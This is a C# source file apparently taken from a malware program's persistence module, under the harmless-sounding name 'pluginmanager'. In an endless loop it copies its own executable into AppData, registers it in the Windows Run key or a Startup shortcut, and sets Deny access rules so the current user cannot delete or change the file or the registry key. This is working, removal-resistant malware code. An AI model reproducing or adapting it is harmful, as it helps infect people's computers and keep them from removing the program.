using System;
using System.Security.AccessControl;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace pluginmanager.Lifetime
{
    public class Register
    {
        private string user = Environment.UserDomainName + "\\" + Environment.UserName;
        private string startupPath = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.Startup), config.LinkName);
        private string installPath = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), config.ExecName);
        public Register()
        {
            new Task(() => { Install(); }).Start();
        }
        public void denyreg(RegistryKey key)
        {
            try
            {
                RegistrySecurity rs = new RegistrySecurity();
                rs.AddAccessRule(new RegistryAccessRule(user,
            RegistryRights.WriteKey | RegistryRights.ChangePermissions | RegistryRights.Delete,
            InheritanceFlags.None,
            PropagationFlags.None,
            AccessControlType.Deny));
                key.SetAccessControl(rs);
            }
            catch (Exception e)
            {
                Logger.Log(this.ToString(), $"Regaccess set failed {e.Message}");

            }
        }
        public void denyfile()
        {
            try
            {
                FileSecurity rs = System.IO.File.GetAccessControl(installPath);
                rs.AddAccessRule(new FileSystemAccessRule(user, FileSystemRights.ChangePermissions | FileSystemRights.Delete,
            InheritanceFlags.None,
            PropagationFlags.None,
            AccessControlType.Deny));
                FileSecurity fSecurity = System.IO.File.GetAccessControl(installPath);
                System.IO.File.SetAccessControl(installPath, rs);
            }
            catch (Exception e)
            {
                Logger.Log(this.ToString(), $"Fileaccess set failed {e.Message}");
            }
        }
        public static bool IsStartup()
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
            {
                var found = key?.GetValue(config.Description);
                return found != null;
            }
        }
        public void Install()
        {
            while (true)
            {
                if (!System.IO.File.Exists(installPath))
                {
                    System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, installPath);
                    denyfile();
                }
                if (!System.IO.File.Exists(startupPath))
                {
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            key.SetValue(config.Description, installPath);
                            denyreg(key);
                        }
                    }
                    catch (Exception e)
                    {
                        if (!IsStartup())
                        {
                            Logger.Log(this.ToString(), $"Reginstall failed, Using Lnk {e.Message}");
                            ShortcutUtil.appShortcutToPath(installPath, startupPath, config.Description);
                        }
                    }
                }
                System.Threading.Thread.Sleep(config.RegisterWaitInterval * 1000);
            }
        }
    }
}
